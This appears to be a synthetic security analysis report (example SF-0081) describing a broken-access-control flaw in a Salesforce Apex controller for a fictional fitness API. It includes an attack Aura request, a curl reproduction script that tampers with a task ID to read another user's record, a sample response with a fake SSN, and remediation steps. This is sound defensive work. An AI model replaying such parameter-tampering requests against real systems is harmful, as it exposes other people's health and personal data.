# Security Analysis Report
**System:** VitalTrack Health API (Salesforce-Integrated)
**Domain:** Fitness / Wearables
**Example ID:** SF-0081
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `TaskController.getTask` — attacker reads any fitness/health Task record; potential PHI exposure |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Task Object (Pattern 2.4)

### Summary
The Apex controller `TaskController` on VitalTrack Health API (`5936b345.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 2.4, the client-controlled `taskId` parameter enables privilege escalation. Given the fitness/health domain, exposed `SensitiveData__c` values may constitute PHI under HIPAA.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getTaskDetails(String taskId, ...)` while the Aura descriptor in §6.0 is `c.TaskController.getTask`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://5936b345.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://5936b345.lightning.force.com/aura
Authorization: Bearer 00D5936B345!AR5936b345...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D5936B345!AR5936b345...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"001B345","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Task Record Returned (potential PHI)**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "001B345", "Name": "Victim Task Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-77-6699"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D5936B345!AR5936b345..."
curl -s -X POST "https://5936b345.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"001B345","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-77-6699
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class TaskController { ... }`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`. Audit PHI fields for HIPAA compliance.
